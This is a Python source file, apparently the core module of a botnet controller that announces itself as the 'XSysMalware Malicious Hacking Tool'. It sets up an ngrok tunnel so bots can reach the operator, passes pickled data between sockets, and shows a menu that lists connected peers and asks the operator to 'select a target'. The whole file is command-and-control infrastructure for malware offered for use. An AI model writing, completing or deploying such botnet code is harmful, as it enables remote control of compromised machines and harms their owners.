import hashlib
import os
import platform
import random
import json
import pickle
import time
from string import punctuation, whitespace, ascii_letters
from pyngrok import ngrok, conf
from socket import socket, timeout, error, AF_INET, SOCK_STREAM, SOCK_DGRAM, gethostbyname
from typing import Any
from dataclasses import dataclass, asdict
from Crypto.Util.Padding import pad, unpad
from Crypto.Cipher import AES


class Config(object):
    __root__ = os.path.join(os.path.dirname(os.path.abspath(__file__)))

    @staticmethod
    def get_ngrok_binary(): return os.path.join(Config.__root__, '../bin', 'ngrok')
    @staticmethod
    def get_config_path(): return os.path.join(Config.__root__, '../config.json')
    @staticmethod
    def get_bot_config(): return os.path.join(Config.__root__, '../bot.json')

    @staticmethod
    def load_config(service=None):
        if service is None:
            config_json = Config.get_config_path()
        else:
            config_json = Config.get_bot_config()
        with open(config_json, 'r') as stream:
            data = json.load(stream)
            stream.close()
        return data

class BotnetSocket(socket):
    """
    class: BotnetSocket (socket)
    this class represents a wrapped socket.socket() object
    which is responsible to operate as a communication interface
    and transmit data between endpoints.
    """
    def __init__(self, *args, **kwargs):
        super(BotnetSocket, self).__init__(*args, **kwargs)


class BotnetInterface(object):
    """
    class: BotnetInterface (object)
    this class represents the scope interface of which a BOTNET network
    interacts interacts according to Admin's class requirements.
    """
    incoming = None
    outgoing = None
    tunnel = None
    config = Config.load_config()

    def __init__(self, insocket: socket = None, outsocket: socket = None):
        if isinstance(insocket, socket):
            self.incoming = insocket
        else:
            self.incoming = socket()

        if isinstance(outsocket, socket):
            self.outgoing = outsocket
        else:
            self.outgoing = socket()

    def populate(self): self.config = Config.load_config('bot')

    def distribute(self):
        bin_path = Config.get_ngrok_binary()
        tunnel = self.config.get('tunnel')
        incoming = self.config.get('incoming')
        pyngrok_config = conf.PyngrokConfig(ngrok_path=bin_path)
        self.tunnel = ngrok.connect(incoming.get('port'), tunnel.get('proto'), pyngrok_config=pyngrok_config)
        with open(Config.get_config_path(), 'r') as stream_read:
            data_read = json.load(stream_read)
            url, port = self.tunnel.public_url.split('://').pop().split(':')
            data_read.get('tunnel')['url'] = url
            data_read.get('tunnel')['port'] = int(port)
            data_write = data_read
            with open(Config.get_config_path(), 'w') as stream_write:
                stream_write.write(json.dumps(data_write))
                stream_write.close()
            stream_read.close()
        self.config = Config.load_config()
        with open(Config.get_bot_config(), 'w') as stream_write:
            data = json.dumps({
                "tunnel": self.config.get("tunnel"),
                "settings": self.config.get("settings")
            })
            stream_write.write(data)
            stream_write.close()

    def accept(self): return self.incoming.accept()

    def connect(self, _address: tuple):
        try:
            self.outgoing.connect(_address)
        except error as e:
            return e
        return True

    def bind(self, _address: tuple): self.incoming.bind(_address)

    def listen(self, _backlog: int): self.incoming.listen(_backlog)

    def send(self, data: Any, connection=None):
        connection = self.outgoing if not connection else connection
        data = pickle.dumps(data)
        connection.sendall(data)

    def receive(self, connection=None):
        connection = self.outgoing if not connection else connection
        data = b''
        pkt = connection.recv(self.config.get('settings').get('buffer'))
        while pkt:
            data += pkt
            if data != b'':
                break
            pkt = connection.recv(self.config.get('settings').get('buffer'))
        data = pickle.loads(data)
        return data


@dataclass
class Envelope(object):
    """
    class: Envelope (object)
    this class represents the data structure for
    which a socket endpoint transmit among the Flux Network.
    """
    Id: str
    DataText: str

    def __init__(self, data=None):
        self.Id = hex(id(data))
        self.DataText = data

    def __repr__(self):
        return '<Envelope %r>' % asdict(self)


@dataclass
class Peer(object):
    """
    class: Peer (object)
    this class represents the connection data for
    which a socket is connected to an endpoint.
    """
    Id: str
    Socket: socket
    Address: tuple
    online: bool

    def __init__(self, peer_id=None, peer=None, address=None, online=False):
        self.Id = peer_id
        self.Socket = peer
        self.Address = address
        self.online = online

    def __repr__(self):
        return '<Peer %r>' % asdict(self)


class Menu(object):

    @staticmethod
    def __clear_console__():
        os.system('cls') if platform.platform().lower().startswith('win') else os.system('clear')

    @staticmethod
    def welcome():
        Menu.__clear_console__()
        print('\n')
        print('''
[==================================================]
[  Welcome To XSysMalware  Malicious Hacking Tool  ]
[==================================================] 
[               Version Alpha 1.0.0-1              ]
[  ----------------------------------------------  ] 
[            Created -by- T0x1cEnv31ope            ]   
[==================================================]
''')

    @staticmethod
    def refresh_connections_list(connection: list):
        Menu.__clear_console__()
        print('''[==================================================]
[    Listing all available connections in pool     ] 
[==================================================]
[#]============[REMOTE ADDRESS]============[PEER ID]''')
        conn: Peer
        for i, conn in enumerate(connection):
            peer_id = conn.Id
            ip, port = conn.Address
            print('[%d]             %s:%d            %s' % ((i+1), ip, port, peer_id[:8]))
        return Menu.choose_from_connections(connection)

    @staticmethod
    def choose_from_connections(connections):
        if len(connections) == 0:
            print('[!] No connections!')
            time.sleep(5)
            return
        else:
            print('\n--------\n[!] Enter `0` to exit')
            choice = input('[$] select a  target:\n ')
            if choice in [punctuation, whitespace, ascii_letters]:
                print('[!] unsupported choice %s' % choice)
                time.sleep(5)
                return Menu.refresh_connections_list(connections)
            elif choice == '0':
                return
            else:
                try:
                    choice = connections[int(choice) - 1]
                except IndexError:
                    print('[!] target id  %d doesn\'t exists!')
                    time.sleep(5)
                    return Menu.refresh_connections_list(connections)
        return choice
